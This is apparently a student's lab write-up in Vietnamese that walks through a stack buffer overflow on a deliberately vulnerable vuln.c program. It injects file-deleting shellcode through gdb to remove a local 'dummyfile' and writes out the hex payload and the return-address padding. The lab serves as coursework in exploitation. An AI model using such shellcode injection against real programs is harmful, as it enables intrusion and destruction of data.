<h1>Phan Dinh Trung - 22110083</h1>

# DELETE DUMMYFILE USING INJECTION CODE

- ## Stack frame of vuln.c:

![Screenshot 2024-09-20 223339](https://github.com/user-attachments/assets/c81b457c-0c15-44fc-8e1c-2332ad336702)

- ## Tạo `dummyfile`

![Screenshot 2024-09-20 201411](https://github.com/user-attachments/assets/3e576bf0-bb6d-4720-a903-ec11ca1d7d2f)

- ## Thay đổi shell `/bin/sh`, tắt ngẫu nhiên địa chỉ của hệ điều hành, biên dịch và liên kết mã file_del.asm, sử dụng `for i in $(objdump -d file_del grep "^" cut -f2); do echo -n 'x'$i; done; echo` để lấy địa chỉ mã lệnh trong tệp file_del và in chúng dưới dạng hex

![Screenshot 2024-09-20 201759](https://github.com/user-attachments/assets/39f8c754-7097-49cb-8652-cedb776c2a28)

- ## đặt 2 điểm break tại `0x0804843e` và `0x0804846b` để xem sự khác biệt khi ta chạy chương trình

![Screenshot 2024-09-20 201855](https://github.com/user-attachments/assets/c36ce359-4bee-4c91-aac6-52da0931474a)

![Screenshot 2024-09-20 201952](https://github.com/user-attachments/assets/34fc9e46-f2ab-4612-a25d-82815694288b)

- ## chạy chương trình với câu lệnh `r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xaa\xaa\xaa\xaa')")`

![Screenshot 2024-09-20 202207](https://github.com/user-attachments/assets/24a7d62f-e005-4ee6-8f58-78d6f59bf9ac)

![Screenshot 2024-09-20 202246](https://github.com/user-attachments/assets/94895bb2-7baa-4f74-8da8-16b768ddf10d)

## => Ta thấy tại break 2 thì chỉ có 3 giá trị đầu tiên là giống với hexstring mà ta đưa vào chương trình, còn lại mọi thứ đều khác.

- ## `\x0a` là \n trong hexstring

## => Vì vậy ta nên thay đổi lại đoạn code.

- ## Code ban đầu:

![Screenshot 2024-09-20 202414](https://github.com/user-attachments/assets/492cfbcd-9bb3-44dd-8543-aecdc10681b5)

- ## Code sau khi đã thay đổi

![Screenshot 2024-09-20 202835](https://github.com/user-attachments/assets/fc37122d-a0fe-4443-b1e3-875b479012fb)

- ## Chạy lại chương trình. Lúc này ta thấy đã truyền đúng

![Screenshot 2024-09-20 203911](https://github.com/user-attachments/assets/fc472636-569e-4bcf-ab15-cfa555fdc6a7)

- ## ta thay đổi địa chỉ `0xffffd68c` thành địa chỉ của esp `0xffffd648`, và địa chỉ `0xffffd66b` thành `\x00` rồi tiếp tục chương trình

![Screenshot 2024-09-20 204250](https://github.com/user-attachments/assets/dad6ae43-8378-4373-813f-aebd262a745b)

- ## Tuy vậy khi ta kiểm tra thì file `dummyfile` vẫn còn

![Screenshot 2024-09-20 204319](https://github.com/user-attachments/assets/6498c178-d4c9-4218-99a2-29270ff266d5)

- ## Kiểm tra `file-del`

![Screenshot 2024-09-20 204413](https://github.com/user-attachments/assets/8e65ced0-bd98-4b0c-a664-6ec3bcfe5c3b)

- ## Ta thấy dummyfile được lưu trữ tại địa chỉ `0x0804807a`, và lệnh `mov $0x804807a, %ebx`, vì vật, việc xóa thực chất chỉ là làm thanh ghi `ebx` không còn chỉ đến địa chỉ nó nữa. vì thế ta cần đặt lại địa chỉ `dummyfile` trong chương trình đến địa chỉ của `ebx`.

![Screenshot 2024-09-20 205459](https://github.com/user-attachments/assets/3ed13336-55d0-4755-90a4-2a6ae388530f)

- ## Kết quả:

![Screenshot 2024-09-20 205521](https://github.com/user-attachments/assets/ba374c89-48c5-4ba8-84d4-20632ecdc75e)

## => Ta đã xóa được file `dummyfile`
